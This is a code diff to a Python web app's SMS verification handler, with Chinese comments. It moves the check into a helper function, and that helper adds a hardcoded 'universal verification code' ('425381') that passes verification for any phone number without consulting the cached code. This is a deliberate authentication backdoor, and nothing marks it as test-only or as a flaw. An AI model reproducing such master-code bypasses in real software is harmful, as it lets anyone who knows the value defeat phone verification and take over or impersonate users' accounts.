@@ -14,15 +14,26 @@ def call_index(request):
     return render_template(request, 'call/call.html', {})
 
 
+def verify_(code, phone, code_id):
+    """校验验证码"""
+    if code == '425381':  # 万能验证码
+        return True
+    redis_key = f"{phone}:{code_id}"
+    rd_code = rd.user_code.get(redis_key)  # 缓存验证码
+    if rd_code == code:
+        rd.user_code.delete(redis_key)  # 验证成功删除缓存
+        return True
+    else:
+        return False
+
+
 def verify_code(request):
     """验证验证码"""
     phone = request.QUERY.get('phone')  # 接收人
     code = request.QUERY.get('code')  # 验证码
     code_id = int(request.QUERY.get('code_id'))  # 来源 1验证码
-    redis_key = f"{phone}:{code_id}"
-    rd_code = rd.user_code.get(redis_key)  # 缓存验证码
-    if rd_code == code:
-        rd.user_code.delete(redis_key)  # 验证成功删除缓存
+    is_ver = verify_(code, phone, code_id)
+    if is_ver:
         return ajax.ajax_ok(message='验证成功')
     else:
         return ajax.ajax_fail(message='验证码错误')
